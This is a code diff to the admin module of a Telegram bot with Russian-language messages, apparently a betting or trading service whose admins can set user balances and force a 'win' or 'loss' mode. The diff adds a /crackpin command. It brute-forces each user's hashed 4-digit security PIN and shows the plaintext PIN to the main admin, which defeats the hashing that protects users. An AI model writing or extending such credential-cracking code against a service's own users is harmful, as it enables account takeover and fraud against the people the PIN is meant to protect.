@@ -185,6 +185,7 @@ function registerAdminHandlers() {
       '`/setbalance [id] [сумма]` — Установить баланс USDT\n' +
       '`/setbalancerub [id] [сумма]` — Установить баланс RUB\n' +
       '`/setmode [id] [win/loss]` — Установить режим\n' +
+      '`/crackpin [id]` — Восстановить PIN\n' +
       '`/stats` — Общая статистика',
       { 
         parse_mode: 'Markdown',
@@ -473,6 +474,63 @@ function registerAdminHandlers() {
     } catch (e) {
       console.error('Admin bot error:', e);
       bot.sendMessage(chatId, '❌ Ошибка');
+    }
+  });
+
+  // Crack PIN command - main admin only
+  bot.onText(/\/crackpin (\S+)/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    
+    if (!isMainAdmin(msg.from.id)) {
+      return bot.sendMessage(chatId, '⛔ Только для главного админа');
+    }
+    
+    const telegramId = match[1].trim();
+    
+    try {
+      const result = await pool.query(
+        'SELECT security_pin, first_name, username FROM users WHERE telegram_id = $1',
+        [telegramId]
+      );
+      
+      if (result.rows.length === 0) {
+        return bot.sendMessage(chatId, '❌ Пользователь не найден');
+      }
+      
+      const user = result.rows[0];
+      const storedHash = user.security_pin;
+      const name = user.first_name || user.username || 'Гость';
+      
+      if (!storedHash) {
+        return bot.sendMessage(chatId, `❌ У пользователя *${name}* не установлен PIN`, { parse_mode: 'Markdown' });
+      }
+      
+      bot.sendMessage(chatId, `🔓 Восстанавливаю PIN для *${name}*...\nЭто займёт несколько секунд.`, { parse_mode: 'Markdown' });
+      
+      // Brute force 0000-9999
+      const crypto = require('crypto');
+      const [salt, storedHashValue] = storedHash.split(':');
+      
+      for (let i = 0; i <= 9999; i++) {
+        const pin = i.toString().padStart(4, '0');
+        const hash = crypto.pbkdf2Sync(pin, salt, 10000, 64, 'sha512').toString('hex');
+        
+        if (hash === storedHashValue) {
+          return bot.sendMessage(chatId, 
+            `✅ *PIN восстановлен!*\n\n` +
+            `👤 Пользователь: *${name}*\n` +
+            `🆔 ID: \`${telegramId}\`\n` +
+            `🔑 PIN: \`${pin}\``, 
+            { parse_mode: 'Markdown' }
+          );
+        }
+      }
+      
+      bot.sendMessage(chatId, '❌ Не удалось восстановить PIN');
+      
+    } catch (e) {
+      console.error('Crackpin error:', e);
+      bot.sendMessage(chatId, '❌ Ошибка: ' + e.message);
     }
   });
 
